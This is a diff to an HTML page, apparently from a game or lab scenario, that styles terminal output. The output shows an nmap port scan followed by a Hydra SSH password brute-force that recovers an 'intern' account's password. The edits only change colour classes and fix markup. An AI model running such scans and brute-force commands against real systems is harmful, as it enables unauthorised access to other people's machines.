@@ -22,8 +22,8 @@ Host is up (0.00061s latency).
 
 PORT     STATE  SERVICE
 22/tcp   <span class="orange"><strong>open</strong></span>   ssh
-80/tcp   <span class="red"><strong>closed</strong></span> http
-443/tcp  <span class="red"><strong>closed</strong></span> https
+80/tcp   <span class="orange"><strong>closed</strong></span> http
+443/tcp  <span class="orange"><strong>closed</strong></span> https
 3306/tcp <span class="orange"><strong>open</strong></span>   mysql
 
 Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
@@ -35,11 +35,11 @@ Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ hydra -l intern -P ROCK_YOU_10.txt ssh://TECH-BUREAU
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
 Hydra starting at 2026-02-21 16:12:15
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Many SSH configurations limit the number of parallel tasks
 [DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
 [DATA] attacking ssh://TECH-BUREAU:22/
 
-[22][ssh] host: <span class="orange">TECH-BUREAU</strong></span>   login: <span class="orange">intern</strong></span>   password: <span class="orange">football</strong></span>
+[22][ssh] host: <span class="orange"><strong>TECH-BUREAU</strong></span>   login: <span class="orange"><strong>intern</strong></span>   password: <span class="orange"><strong>football</strong></span>
 1 of 1 target successfully completed, 1 valid password found
 Hydra finished at 2026-02-21 16:12:21
 </code></pre>
